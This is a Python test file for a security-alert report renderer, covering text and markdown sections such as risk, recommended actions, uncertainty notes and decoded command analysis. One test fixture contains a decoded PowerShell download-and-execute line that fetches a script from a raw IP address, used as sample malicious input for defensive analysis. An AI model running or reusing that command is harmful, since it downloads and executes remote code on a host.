from datetime import datetime, timezone

from tests.test_schemas import _make_report
from app.report_render import render_markdown, render_text, report_sections
from app.schemas import CommandDecodeResult, DecodedSegment, InvestigationStep


def test_text_rendering_matches_the_established_show_report_layout():
    report = _make_report(
        recommended_actions=["Block the source IP at the network perimeter"],
        uncertainty_notes="no MITRE ATT&CK mapping available for this alert",
    )

    output = render_text(report_sections(report))

    assert f"Report {report.report_id} (alert {report.alert_id})" in output
    assert "Status: draft" in output
    assert "Summary:" in output
    assert report.alert_summary in output
    assert "Risk: severity=medium, confidence=high" in output
    assert "Recommended actions:" in output
    assert "  - Block the source IP at the network perimeter" in output
    assert "Uncertainty notes: no MITRE ATT&CK mapping available for this alert" in output


def test_uncertainty_notes_render_as_none_when_empty():
    output = render_text(report_sections(_make_report()))
    assert "Uncertainty notes: (none)" in output


def test_command_analysis_section_is_omitted_when_absent():
    output = render_text(report_sections(_make_report()))
    assert "Command analysis:" not in output


def test_command_analysis_section_renders_decoded_segments():
    report = _make_report(command_analysis=CommandDecodeResult(
        command_line="powershell.exe -EncodedCommand AAA",
        decoded_segments=[DecodedSegment(
            encoding="powershell_encoded", original="AAA",
            decoded="IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.1/a.ps1')",
        )],
    ))

    output = render_text(report_sections(report))

    assert "Command analysis:" in output
    assert "Command line: powershell.exe -EncodedCommand AAA" in output
    assert "[powershell_encoded]" in output


def test_timeline_section_lists_step_names_and_actions():
    report = _make_report(investigation_timeline=[
        InvestigationStep(
            step_name="enrich", action="skipped",
            output_summary="skipped: no validated indicators to enrich",
            timestamp=datetime.now(timezone.utc),
        )
    ])

    output = render_text(report_sections(report))

    assert "  - enrich: skipped" in output


def test_markdown_renders_headings_bullets_and_footer():
    report = _make_report(recommended_actions=["Escalate to a human analyst for manual review"])

    output = render_markdown(report, report_sections(report))

    assert output.startswith(f"# Investigation Report {report.report_id}")
    assert "## Summary" in output
    assert "## Recommended actions" in output
    assert "- Escalate to a human analyst for manual review" in output
    assert output.rstrip().endswith("_Internal — Ryt Bank_")


def test_markdown_omits_sections_the_text_renderer_omits():
    output = render_markdown(_make_report(), report_sections(_make_report()))
    assert "## Command analysis" not in output
